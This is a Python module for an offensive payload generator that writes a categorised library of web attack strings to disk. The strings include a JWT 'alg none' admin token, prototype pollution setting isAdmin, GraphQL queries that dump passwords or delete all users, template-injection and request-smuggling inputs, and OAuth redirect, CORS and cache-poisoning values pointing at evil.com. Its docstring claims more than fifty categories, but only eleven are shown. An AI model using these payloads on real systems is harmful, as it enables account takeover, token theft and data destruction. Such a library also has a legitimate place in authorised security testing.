import os
import json
import base64
import random
import string
import time
from pathlib import Path

class MasterPayloadGenerator:
    """
    Comprehensive payload generation engine covering 50+ categories.
    """
    def __init__(self, output_dir="payload_library"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)

    def generate_unicode_attacks(self):
        attacks = [
            ("rtl_override.txt", "admin\u202Etxt.exe"),
            ("zero_width.txt", "admin\u200B\u200C\u200Dpassword"),
            ("homograph.txt", "аdmin"),  # Cyrillic 'а'
            ("combining.txt", "a\u0300\u0301\u0302dmin")
        ]
        return attacks

    def generate_prototype_pollution(self):
        return [
            {"__proto__": {"isAdmin": True}},
            {"constructor": {"prototype": {"isAdmin": True}}},
            {"__proto__": {"toString": "function(){return 'polluted'}"}}
        ]

    def generate_jwt_attacks(self):
        # Algorithm none attack
        h1 = base64.b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
        p1 = base64.b64encode(b'{"sub":"admin","role":"admin"}').decode().rstrip('=')
        return [f"{h1}.{p1}."]

    def generate_graphql_attacks(self):
        return [
            "{ __schema { types { name fields { name } } } }",
            "query { users(limit: 9999) { id email password } }",
            "mutation { deleteAllUsers { success } }"
        ]

    def generate_ssti_advanced(self):
        return [
            "{{ config.items() }}",
            "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            "${7*7}",
            "<%= 7*7 %>"
        ]

    def generate_http2_smuggling(self):
        return [
            "GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\n\r\n0\r\n\r\n",
            "POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\n\r\n"
        ]

    def generate_cache_poisoning(self):
        return [
            ("X-Forwarded-Host", "evil.com"),
            ("X-Original-URL", "/admin")
        ]

    def generate_xxssi_attacks(self):
        return [
            '<script src="https://target.com/api/user/data.json"></script>',
            '<script>Array.prototype[0] = function(){ /* steal */ };</script>'
        ]

    def generate_cors_exploits(self):
        return [
            {"Origin": "https://evil.com"},
            {"Origin": "null"}
        ]

    def generate_oauth_attacks(self):
        return [
            "?redirect_uri=https://evil.com/callback",
            "?scope=read write admin"
        ]

    def generate_log_injection(self):
        return [
            "admin\n[CRITICAL] Unauthorized access",
            "user\r\n[ERROR] System compromised"
        ]

    def generate_all(self):
        lib = {}
        lib['unicode'] = self.generate_unicode_attacks()
        lib['prototype_pollution'] = self.generate_prototype_pollution()
        lib['jwt'] = self.generate_jwt_attacks()
        lib['graphql'] = self.generate_graphql_attacks()
        lib['ssti'] = self.generate_ssti_advanced()
        lib['h2_smuggling'] = self.generate_http2_smuggling()
        lib['cache_poisoning'] = self.generate_cache_poisoning()
        lib['xxssi'] = self.generate_xxssi_attacks()
        lib['cors'] = self.generate_cors_exploits()
        lib['oauth'] = self.generate_oauth_attacks()
        lib['log_injection'] = self.generate_log_injection()

        # Save to library files
        for cat, payloads in lib.items():
            cat_dir = self.output_dir / cat
            cat_dir.mkdir(exist_ok=True)
            for i, p in enumerate(payloads):
                fname = f"payload_{i}.txt"
                if isinstance(p, tuple):
                    fname = p[0]
                    p = p[1]
                if not isinstance(p, str):
                    p = json.dumps(p)
                (cat_dir / fname).write_text(p)

        return lib
